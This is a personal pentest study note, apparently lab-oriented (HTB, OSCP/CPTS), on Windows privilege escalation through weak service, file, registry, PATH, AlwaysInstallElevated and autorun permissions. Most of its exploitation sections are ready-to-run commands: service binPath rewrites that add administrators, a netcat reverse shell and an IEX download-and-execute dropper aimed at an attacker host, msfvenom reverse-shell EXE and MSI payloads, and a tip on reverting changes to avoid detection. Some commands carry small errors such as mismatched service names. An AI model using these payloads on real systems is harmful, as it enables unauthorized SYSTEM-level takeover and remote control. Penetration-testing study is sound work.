---
created: 2026-07-23
updated: 2026-07-28
tags:
  - Windows
  - Windows_PrivEsc
status: substantial
---
## Weak permissions

- Weak file system and service permissions are one of the most common privilege escalation vectors on Windows.
- When misconfigured ACLs (Access Control Lists) allow standard users to modify service binaries, registry keys, or directories in `%PATH%`, you can often hijack execution to run arbitrary code as `NT AUTHORITY\SYSTEM`.

---

- **Modifiable Services** -> you can reconfigure the service (change `binpath`, stop/start it)
- **Modifiable Service Binaries** -> you can overwrite the `.exe` the service runs
- **Modifiable Folders in `%PATH%`** -> DLL hijacking / path interception
- **Modifiable Registry `AutoRun`** -> binary or script executed at startup can be replaced
- **`AlwaysInstallElevated` Registry Keys** — allows installing `.msi` files as `SYSTEM`

## Enumeration

### `SharpUp`

- [`SharpUp`](https://github.com/GhostPack/SharpUp/) automates most weak-permission checks in a single run.
- It checks for modifiable services, writable service binaries, `AlwaysInstallElevated`, writable `%PATH%` folders, writable `AutoRun` registry keys, unquoted service paths, and more.

```powershell
.\SharpUp.exe audit
```

> [!example]-
> ```powershell
> PS C:\Tools> .\SharpUp.exe audit
>
> === SharpUp: Running Privilege Escalation Checks ===
>
>
> === Modifiable Services ===
>
>   Name             : WindscribeService
>   DisplayName      : WindscribeService
>   Description      : Manages the firewall and controls the VPN tunnel
>   State            : Running
>   StartMode        : Auto
>   PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
>
>
> === Modifiable Service Binaries ===
>
>   Name             : SecurityService
>   DisplayName      : PC Security Management Service
>   Description      : Responsible for managing PC security
>   State            : Stopped
>   StartMode        : Auto
>   PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
>
>
> === AlwaysInstallElevated Registry Keys ===
>
>
>
> === Modifiable Folders in %PATH% ===
>
>
>
> === Modifiable Registry Autoruns ===
>
>
>
> === *Special* User Privileges ===
>
>
>
> === Unattended Install Files ===
>
>
>
> [*] Completed Privesc Checks in 10 seconds
> ```

### Manual enumeration

- [`icacls`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) displays DACLs (Discretionary Access Control Lists) on specified files:

```powershell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

- [`AccessChk`](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) (from the Sysinternals suite) outputs effective permissions on Windows securable objects, including NTFS files, folders, registry keys, services, processes, SMB shares, and kernel objects:

```powershell
accesschk.exe /accepteula -quvcw WindscribeService
```

| Flag | Description                          |
| ---- | ------------------------------------ |
| `-q` | Omit banner.                         |
| `-u` | Suppress errors.                     |
| `-v` | Verbose output.                      |
| `-c` | Specify name of a Windows service.   |
| `-w` | Show only objects with write access. |

- [`sc.exe`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) is used to display or configure a service or driver:

```bash
sc.exe qc WindscribeService
```

| Command           | Description                                                                 |
| ----------------- | --------------------------------------------------------------------------- |
| `sc.exe query`    | Queries the status for a service / enumerates status for types of services. |
| `sc.exe qc`       | Queries configuration for a service.                                        |
| `sc.exe queryex`  | Queries the extended status for a service.                                  |
| `sc.exe start`    | Starts a service.                                                           |
| `sc.exe stop`     | Sends a `STOP` request to a service.                                        |
| `sc.exe pause`    | Sends a `PAUSE` control request to a service.                               |
| `sc.exe continue` | Sends a `CONTINUE` control request to a paused service.                     |
| `sc.exe config`   | Changes the configuration of a service (persistent).                        |

>[!important] In PowerShell, explicitly specify the extension for `sc.exe`; `sc` is a built-in alias for the [`Set-Content`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-content?view=powershell-7.6) cmdlet.

- `wmic` and `Get-CimInstance` are used to query WMI (Windows Management Instrumentation) classes to retrieve system information, including installed services.

```powershell
wmic service get name,displayname,pathname,startmode
```

```powershell
Get-CimInstance Win32_StartupCommand
```
## Weak service permissions

### Service permissions

>[!important] By default, Windows services run under the local system account, `NT AUTHORITY\SYSTEM`.

- Every Windows service has a **security descriptor** stored in the registry under `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`. This descriptor contains a DACL that determines which users/groups can perform which operations on the service.

- Key access rights for a service:

| Right                   | Hex       | What it allows                                                                                         |
| ----------------------- | --------- | ------------------------------------------------------------------------------------------------------ |
| `SERVICE_CHANGE_CONFIG` | `0x0002`  | Reconfigure the service, such as changing `binpath`, start type, account, and so on (`sc.exe config`). |
| `SERVICE_STOP`          | `0x0020`  | Stop the service.                                                                                      |
| `SERVICE_START`         | `0x0010`  | Start the service.                                                                                     |
| `SERVICE_ALL_ACCESS`    | `0xF01FF` | Full control (all access rights for a service).                                                        |

>[!note] See [`Access Rights for a Service, Service Security and Access Rights — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights#access-rights-for-a-service).

>[!bug] `SERVICE_CHANGE_CONFIG` and `SERVICE_ALL_ACCESS` (includes the former) allow you to modify a service's `binPath` (binary path) and **execute arbitrary code as `NT AUTHORITY\SYSTEM`**. 
### Enumerating services

- Enumerate all Windows services (using `Win32_Services` WMI/CIM class) and display their key properties:

```powershell
Get-CimInstance -ClassName Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName, StartName | Format-Table -AutoSize
```

- Enumerate Windows services that run as `SYSTEM` account (`LocalSystem`) and have an executable located **outside** the `C:\Windows\` directory:

```powershell
Get-CimInstance -ClassName Win32_Service | Where-Object { $_.StartName -eq 'LocalSystem' -and $_.PathName -notlike 'C:\Windows*' } | Format-Table Name, PathName, StartMode -AutoSize
```

- Services that have executables outside `C:\Windows\` are most likely third-party and have greater chances of having weak permissions.
### Enumerating service permissions

- Check service configuration using `sc.exe qc`:

```powershell
sc.exe qc WindscribeService
```

> [!example]-
> ```powershell
> PS C:\> sc.exe qc WindscribeService
> ```
> ```powershell
> [SC] QueryServiceConfig SUCCESS
>
> SERVICE_NAME: WindscribeService
>         TYPE               : 10  WIN32_OWN_PROCESS
>         START_TYPE         : 2   AUTO_START
>         ERROR_CONTROL      : 1   NORMAL
>         BINARY_PATH_NAME   : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
>         LOAD_ORDER_GROUP   :
>         TAG                : 0
>         DISPLAY_NAME       : WindscribeService
>         SERVICE_START_NAME : LocalSystem
> ```
>-  `SERVICE_START_NAME : LocalSystem` -> the service runs as `SYSTEM`

>[!important] `SERVICE_START_NAME : LocalSystem` means the service runs as `SYSTEM` (as most Windows services by default).

- If you can change the `BINARY_PATH_NAME`, (`binPath`) parameter of a server running as `SYSTEM`, your payload executes as `SYSTEM`.

- List service access rights using `AccessChk.exe`:

```powershell
accesschk.exe /accepteula -quvcw WindscribeService
```

>[!example]-
> ```powershell
> .\accesschk.exe /accepteula -quvcw WindscribeService
> ```
> 
> ```powershell
> Accesschk v6.13 - Reports effective permissions for securable objects
> Copyright ⌐ 2006-2020 Mark Russinovich
> Sysinternals - www.sysinternals.com
> 
> WindscribeService
>   Medium Mandatory Level (Default) [No-Write-Up]
>   RW NT AUTHORITY\SYSTEM
>         SERVICE_ALL_ACCESS
>   RW BUILTIN\Administrators
>         SERVICE_ALL_ACCESS
>   RW NT AUTHORITY\Authenticated Users
>         SERVICE_ALL_ACCESS
> ```
>- `NT AUTHORITY\SYSTEM`, `Admnistrators`, and `Authenticated Users` all have full access rights for this service.
>- This means that any authenticated user can reconfigure the service, which is a path to privilege escalation.
>
>>[!info] `Authenticated Users` is a special Windows security group that automatically includes **any user account that has successfully logged on** using valid credentials. This includes all local user accounts, domain accounts, and accounts from trusted domains, but explicitly excludes the built-in **`Guest`** account and `Anonymous Logon` sessions. See [[Windows groups]].
>

> [!tip]+ Check **all** services for weak permissions in one shot:
> ```powershell
> accesschk.exe /accepteula -quvcw *
> ```
>- This can produce a lot of output, so it's useful to save it into a file and grep:
> ```powershell
> accesschk.exe /accepteula -quvcw * > C:\Temp\services_access.txt 2>&1
> ```
> 
> ```powershell
> findstr "SERVICE_CHANGE_CONFIG" C:\Temp\services_access.txt
> ```

- Check the service status:

```powershell
sc.exe query WindscribeService
```

### Escalating privileges by changing the service `binPath`

- If you have `SERVICE_CHANGE_CONFIG` and `SERVICE_ALL_ACCESS` on a service running as `SYSTEM`, you can modify the service's `binPath`, and your **payload will execute as `NT AUTHORITY\SYSTEM`**.
- You can change `binPath` using `sc.exe config` to, for example, a command that adds your current user to the `Administrators` or `Domain Admins` group:

```powershell
sc.exe config WindscribeService binpath="cmd /c net localgroup administrators janedoe /add"
```

>[!tip]+ Other useful payloads
> - Create a user and add them to the local `Administrators` group: `cmd /c net user janedoe passwd /add && net localgroup administrators htb-student /add`.
> - Reverse shell: `cmd /c C:\Temp\nc.exe -e cmd.exe <attacker_ip_address> <port>`.
> - Execute a dropper: `cmd /c powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip_address>/shell.ps1')"`.

> [!example]-
> ```powershell
> PS C:\Tools> sc.exe config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
>```
>
>```powershell
> [SC] ChangeServiceConfig SUCCESS
> ```

- For the changes to take effect, restart the service:

```powershell
sc.exe stop WindscribeService
```

```powershell
sc.exe start WindscribeService
```

- The service is expected to fail on `sc.exe start`, since its original binary has been replaced with your payload, and the SCM (Service Control Manager) can't load it as a service. 
- However, **`cmd /c` executes before the failure message appears**. Which means that at this point, your payload has already run.

> [!example]+ Service start failure (expected)
> ```powershell
> PS C:\Tools> sc.exe start WindscribeService
>```
>```powershell
> [SC] StartService FAILED 1053:
>
> The service did not respond to the start or control request in a timely fashion.
> ```

- Verify privilege escalation: 

```powershell
net localgroup administrators
```

> [!example]-
> ```powershell
> PS C:\Tools> net localgroup administrators
>```
>
>```powershell
> Alias name     administrators
> Comment        Administrators have complete and unrestricted access to the computer/domain
>
> Members
>
> -------------------------------------------------------------------------------
> Administrator
> htb-student
> mrb3n
> The command completed successfully.
> ```

> [!note]+ Revert the service to its original configuration to avoid detection and restore the proper work of the target infrastructure: 
> 
> ```powershell
> sc.exe config WindscribeService binpath="C:\Program Files (x86)\Windscribe\WindscribeService.exe"
> ```
> 
> ```powershell
> sc.exe start WindscribeService
> ```
> ```powershell
> sc.exe query WindscribeService
> ```
> 

### Escalating privileges by changing the service binary

- If the directory where the service's binary is located has weak permissions (i.e., the service binary itself can be modified), you can replace the binary with your own executable; it will run as `NT AUTHORITY/SYSTEM`. 

>[!note] `SharUp` reports these kinds of misconfiguration under `Modifiable Service Binaries`.

1. Generate a binary with your payload using `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip_address> LPORT=<port> -f exe -o SecurityService.exe
```

> [!note] On an OSCP/CPTS engagement, the lab environment typically provides a pre-built malicious binary or you use a simple `msfvenom` payload. For exam scenarios, a binary that adds a local admin is often simpler and more reliable than a reverse shell.

2. Transfer the binary to the target.
3. Back up the original service binary:

```powershell
copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" C:\Temp\SecurityService.exe.bak
```

4. Replace the original binary with the one you generated:

```powershell
copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

5. Restart the service (or wait for auto-restart / system restart if you don't have permissions):

```powershell
sc.exe stop WindscribeService
```

```powershell
sc.exe start SecurityService
```

> [!tip] If the service doesn't restart cleanly, you can use `taskkill` or wait for a crash.
## Unquoted service paths

### Service `ImagePath`

- A service's `ImagePath` refers to the registry value that specifies the executable path for that service. It's typically located at `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<ServiceName>\ImagePath`.

>[!bug] If the service path stored in `ImagePath` contains **spaces** and **is not enclosed in quotes**, Windows executes **the first executable found in the path segments**. If you can write to any of those paths, you can drop your own binary and it will execute as `NT AUTHORITY\SYSTEM`.

>[!example]+
> - Suppose `ImagePath` of a service contains the following unquoted path:
> 
> ```
> C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
> ```
> 
> - Windows resolves this by trying each space-delimited token as a potential executable (appends `.exe` implicitly), from the highest to the lowest priority:
> 	1. `C:\Program.exe`
> 	2. `C:\Program Files.exe`
> 	3. `C:\Program Files (x86)\System.exe`
> 	4. `C:\Program Files (x86)\System Explorer.exe`
> 	5. `C:\Program Files (x86)\System Explorer\service.exe`
> 	6. `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe` (finally, the intended binary).
> - If you can place your own binary to any of those locations, it will execute as `SYSTEM`. 

> [!important] The `.exe` extension is implicit — you don't need to include it in the filename.

### Finding unquoted service paths

- Using `wmic`:

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

- Using `Get-CimIstance`:

```powershell
Get-CimInstance -ClassName Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\Windows*' -and $_.PathName -notmatch '""' } | Select-Object Name, PathName, StartMode
```

- These commands enumerate Windows services, filter the output to services that **start automatically** and those executables are located outside the `C:\Windows\` directory, then **exclude paths containing quotation paths** (leaving only unquoted service paths).

- Check the path of a specific service (`BINARY_PATH_NAME`):

```powershell
sc qc SystemExplorerHelpService
```

> [!example]+
> ```powershell
> PS C:\> sc qc SystemExplorerHelpService
> ```
> 
> ```powershell
> [SC] QueryServiceConfig SUCCESS
>
> SERVICE_NAME: SystemExplorerHelpService
>         TYPE               : 10  WIN32_OWN_PROCESS
>         START_TYPE         : 2   AUTO_START
>         ERROR_CONTROL      : 1   NORMAL
>         BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
>         SERVICE_START_NAME : LocalSystem
> ```
>- `BINARY_PATH_NAME` isn't quoted and contains spaces. This is the vulnerable configuration.

### Escalating privileges via unquoted service paths

- To exploit unquoted service paths, you need **write permissions** in a parent directory of the original service's binary path.
- It's rare in practice, since the `Program Files` directory and root of `C:\` are typically only writable by administrator — but this still happens, even on modern systems.
- To check if you can write into a directory, use `icacls`:

```powershell
icacls "C:\Program Files (x86)"
```

```powershell
icacls "C:\Program Files (x86)\System Explorer"
```

```powershell
icacls "C:\Program Files (x86)\System Explorer\service"
```

- If exploitable, place your binary at the appropriate path (the one with the highest priority you ca write into). Sometimes, it's a direct replacement of the service's binary (see [[#Escalating privileges by changing the service binary]]).

```powershell
copy /Y exploit.exe C:\Program Files (x86)\System.exe
```

- Restart the service (or wait for auto-restart / system restart if you don't have permissions):

```powershell
sc.exe stop WindscribeService
```

```powershell
sc.exe start SecurityService
```
## Permissive registry ACLs

>[!bug] A service's configuration is stored in Windows Registry under `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>` (as mentioned above). If you can modify the `ImagePath` value in this registry key, you can point it to an arbitrary executable of your choice — and it will run as `SYSTEM`. 

- It's essentially the same vulnerability as weak service permissions, but the exploitation is slightly different (through the registry rather than through the SCM API).
---
- Check permissions on service registry keys for a specific user (e.g., `janedoe`):

```powershell
accesschk.exe /accepteula "janedoe" -kvuqsw hklm\System\CurrentControlSet\services
```

> [!example]-
> ```powershell
> PS C:\> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
> ```
> ```powershell
>
> Accesschk v6.13 - Reports effective permissions for securable objects
> Copyright © 2006-2020 Mark Russinovich
> Sysinternals - www.sysinternals.com
>
> RW HKLM\System\CurrentControlSet\services\ModelManagerService
>         KEY_ALL_ACCESS
>
> # ...
> ```

 >[!important] `KEY_ALL_ACCESS` on `ModelManagerService` means the specified user can modify any value in that service's registry key, including `ImagePath`.

- Enumerate using PowerShell's `Get-Acl`:

```powershell
Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService" | Format-List
```

```powershell
$acl = Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService"
$acl.Access | Format-Table IdentityReference, RegistryRights, AccessControlType
```

### Escalating privileges by changing service's `ImagePath` Registry key

- To set Registry key values, use [`Set-ItemProperty`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-itemproperty?view=powershell-7.6):

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService" -Name "ImagePath" -Value "cmd /c net localgroup administrators htb-student /add"
```

- Or, with `reg`:

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ModelManagerService" /v ImagePath /t REG_EXPAND_SZ /d "cmd /c net localgroup administrators htb-student /add" /f
```

- Then restart the service:

```powershell
sc.exe stop ModelManagerService
```

```powershell
sc.exe start ModelManagerService
```
## Modifiable folders in `%PATH%`  — DLL hijacking

### DLLs without a path

- When a service or application loads a DLL by name (without a full path), Windows searches directories in the following order:
	1. The directory from which the application loaded.
	2. The system directory (`C:\Windows\System32`).
	3. The 16-bit system directory.
	4. The Windows directory (`C:\Windows`).
	5. The current directory.
	6. Directories listed in the `PATH` environment variable.

>[!bug] If you can write to any directory in the `%PATH%` environment variable, you can load your custom DLL (given the DLL with the name the service searches for doesn't appear in any locations searched before `%PATH%`). If it gets loaded by a service/application running with higher privileges, you have escalation.
### Enumerate writable `%PATH%` directories

- To enumerate writable directories in `%PATH%`, use `SharpUp` (`Modifiable Folders in %PATH%` section):

```powershell
SharpUp.exe audit
```

> [!example]+ `SharpUp` highlights writable folders
> ```
> === Modifiable Folders in %PATH% ===
>
>   C:\Users\htb-student\tools
> ```

- To check manually, split `%PATH%` and test each directory:

```powershell
$env:PATH -split ';' | ForEach-Object { icacls $_.Trim() 2>$null | Select-String "(F)|(M)|(W)" }
```

```powershell
$paths = $env:PATH -split ';'
foreach ($p in $paths) {
    $acl = icacls $p.Trim() 2>$null
    if ($acl -match "(BUILTIN\\Users|Everyone|Authenticated Users).*\(F\)") {
        Write-Host "[WRITABLE] $p" -ForegroundColor Red
    }
}
```

### Escalating privileges via DLL injection

- Check which DLLs the target service tries to load using [`Process Minitor`](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) (from the Sysinternals suite). Filter by process name and look for DLLs the service tries to load but can't find (`Name Not Found` in results).

```powershell
procmon.exe
```

- Plant the malicious DLL:

```powershell
cmd /c copy evil.dll "C:\Users\htb-student\tools\missing.dll"
```

- Trigger the service to reload:

```powershell
sc.exe stop VulnService
sc.exe start VulnService
```

## `AlwaysInstallElevated`

### `AlwaysInstallElevated` and `.msi`

- [`AlwaysInstallElevated`](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) is a Windows Group Policy setting that standard, non-administrator users to install `.msi` files (Windows Installer packages) with elevated `SYSTEM` privileges. 
- For this to work, `AlwaysInstallElevated = 1` must be set for both of these keys:
	- `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer`
	- `HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer`

>[!bug] With `AlwaysInstallElevated`, you can install a custom `.msi` package that executes arbitrary code, such as a reverse shell, **as `NT AUTHORITY\SYSTEM`**.
### Escalating privileges using `AlwaysInstallElevated`

- Check if `AlwaysInstallElevated` is enabled — both keys must return `0x1`:

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

> [!example]- Both must return `0x1`
> ```powershell
> PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
>```
>```powershell
> HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
>     AlwaysInstallElevated    REG_DWORD    0x1
>```
>```powershell
> PS C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
>```
>```powershell
> HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
>     AlwaysInstallElevated    REG_DWORD    0x1
> ```

- Generate a `.msi` using `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip_address> LPORT=<port> -f msi -o shell.msi
```

```bash
msfvenom -p windows/exec CMD="net localgroup Administrators janedoe /add" -f msi -o adduser.msi
```

- Transfer the file to the target. 

```bash
python -m http.server 8080
```

```powershell
powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('http://<attacker_ip_address>:8080/adduser.msi','C:\Temp\adduser.msi')"
```

- Install the `.msi` as `SYSTEM` (thanks to `AlwaysInstallElevated`) using `msiexec`:

```powershell
msiexec /quiet /qn /i C:\Temp\adduer.msi
```

> [!warning] `msiexec` with `/quiet` runs silently — no GUI. The payload executes as `SYSTEM` because the `AlwaysInstallElevated` policy grants elevated installation rights.

> [!note] See also: [[🛠️ DLL injection]] for DLL-based `AlwaysInstallElevated` payloads (which can be more stealthy than full `.msi` packages).



## Writable `AutoRun` binaries

### How it works

- **Autoruns** refer to mechanisms that automatically execute programs, scripts, or commands during specific system events, such as system startup, user logon/logoff, scheduled times, service startup, etc.
- Those mechanisms include, for example:
	- Registry `Run` and `RunOnce` keys
	- Startup folders
	- Windows Services
	- Scheduled Tasks
	- Winlogon entries 
	- Logon scripts
	- WMI Event Subscriptions
- The [`Autoruns`](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns) utility (from the Sysinternals suite) enumerates many of these locations.

>[!bug] Autoruns become a privilege escalation opportunity when a privileged account automatically executes a program that a low-privileged user can modify.

- Common autorun locations:
	- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` — every user logon (machine-level autoruns).
	- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` — current user logon (per-user autoruns).
	- `HKLM\...\RunOnce` — runs once at the next logon.
	- `HKCU\...\RunOnce` — runs once for the current user.
	- Startup folder (`C:\ProgramData\...\Startup`) — every user logon.
	- User Startup folder (`%APPDATA%\...\Startup`) — current user logon.
	- Scheduled Tasks — run automatically according to their configured trigger.
	- Windows Services — service start or system boot.

> [!tip]+ For a comprehensive list of autorun locations, see:
> - [`Privilege Escalation with Autoruns — HackTricks`](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html)
> - [`Autoruns — The Microsoft Press Store by Pearson`](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
### Enumerating autoruns

- To enumerate autoruns, you can use the `Win32_StartupCommand` WMI/CIM class:

```powershell
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | Format-List
```

> [!example]-
> ```powershell
> PS C:\> Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | Format-List
>```
>
>```powershell
> Name     : SecurityHealth
> Command  : "C:\Program Files\Windows Defender\MSASCuL.exe"
> Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
> User     : Machine
> ```

- You can also inspect `Run` and `RunOnce` keys directly:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>nul
```

```powershell
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>nul
```

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" 2>nul
```

```powershell
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" 2>nul
```

- Check the startup folders:

```powershell
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

```powershell
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

- Use `SharpUp` to check:

```powershell
.\SharpUp.exe audit
```

> [!example]+ `SharpUp` section
> ```powershell
> .\SharpUp.exe audit
> ```
> ```
> # ...
> === Modifiable Registry Autoruns ===
>
>   HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
>     SecurityHealth : "C:\Program Files\Windows Defender\MSASCuL.exe"
>
>   [!] Modifiable autorun: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\cleanup.exe
> ```

### Escalating privilege using autoruns

- If the autorun binary is writable, you can replace it:

```powershell
cmd /c copy /Y C:\Temp\adduser.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\cleanup.exe"
```

- Wait for the next reboot or user logon — the binary will execute in the context of whichever user it's configured for (potentially `SYSTEM` if it's an `HKLM` entry).
## References and further reading

- [`Service Security and Access Rights — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)
- [`AccessChk — Microsoft Sysinternals`](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
- [`SharpUp — GitHub`](https://github.com/GhostPack/SharpUp/)
- [`icacls — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
- [`sc — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query)
- [`Privilege Escalation with Autorun Binaries — HackTricks`](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html)
- [`EoP - Weak Service Permissions — Internal All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#weak-service-permissions)
